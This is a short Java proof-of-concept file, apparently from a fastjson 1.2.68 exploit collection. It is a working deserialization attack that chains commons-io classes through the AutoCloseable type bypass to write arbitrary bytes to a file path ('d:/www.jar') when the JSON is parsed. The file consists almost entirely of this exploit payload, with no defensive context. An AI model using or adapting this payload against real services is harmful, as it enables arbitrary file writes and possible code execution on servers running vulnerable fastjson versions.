package com.firebasky.fastjson.poc1268;

import com.alibaba.fastjson.JSON;

/**
 * 通过common-io组件写文件 form 蔡师傅
 */
public class write {
    public static void main(String[] args) {

        String write = "{\n" +
                "\t\"abc\": {\n" +
                "\t\t\"@type\": \"java.lang.AutoCloseable\",\n" +
                "\t\t\"@type\": \"org.apache.commons.io.input.BOMInputStream\",\n" +
                "\t\t\"delegate\": {\n" +
                "\t\t\t\t\"@type\": \"org.apache.commons.io.input.TeeInputStream\",\n" +
                "\t\t\t\t\"input\": {\n" +
                "\t\t\t\t\t\"@type\": \"java.io.ByteArrayInputStream\",\n" +
                "\t\t\t\t\t\"buf\": \"MQ0K\",\n" +
                "\t\t\t\t\t\"offset\": 0,\n" +
                "\t\t\t\t\t\"length\": \"1\"\n" +
                "\t\t\t\t\t},\n" +
                "\t\t\t\t\"branch\": {\n" +
                "\t\t\t\t\t\"@type\": \"java.io.FileOutputStream\",\n" +
                "\t\t\t\t\t\"file\": \"d:/www.jar\",\n" +
                "\t\t\t\t\t\"append\": false\n" +
                "\t\t\t\t\t}\n" +
                "\t\t\t\t},\n" +
                "\t\t\"boms\": [{\n" +
                "\t\t\t\"charsetName\": \"xxxx\",\n" +
                "\t\t\t\"bytes\": [0, 0, 0, 0]\n" +
                "\t\t\t}]\n" +
                "\t\t},\"address\": {\n" +
                "\t\t\t\"$ref\": \"$.abc.BOM\"\n" +
                "\t\t}\n" +
                "}";
        Object parse = JSON.parse(write);
        System.out.println(parse);
    }
}
